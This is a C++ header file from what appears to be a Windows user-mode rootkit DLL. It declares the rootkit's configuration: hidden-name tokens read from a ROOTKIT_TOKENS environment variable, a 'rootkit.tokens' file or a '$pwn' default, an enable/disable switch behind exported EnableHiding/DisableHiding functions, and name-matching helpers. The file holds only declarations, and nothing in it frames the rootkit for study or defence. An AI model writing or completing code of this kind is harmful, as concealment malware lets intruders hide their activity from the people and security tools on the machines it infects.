#ifndef CONFIG_H
#define CONFIG_H

#include <Windows.h>

//
// Runtime configuration of the rootkit: the hidden tokens and the on/off
// switch driven by the exported EnableHiding / DisableHiding functions.
//
namespace Config
{
	constexpr size_t kMaxTokens = 8;
	constexpr size_t kMaxTokenLength = 64;

	// Load the hidden tokens. Priority: ROOTKIT_TOKENS environment variable,
	// then a "rootkit.tokens" file next to the DLL, then the "$pwn" default.
	void Initialize(HMODULE hModule);

	// Hot toggle used by the exported EnableHiding / DisableHiding.
	void SetEnabled(bool enabled);
	bool IsEnabled();

	// Case-insensitive "does the bounded / null-terminated name contain a hidden token".
	bool Matches(const wchar_t* lpName, size_t length);
	bool Matches(const wchar_t* lpName);
}

#endif
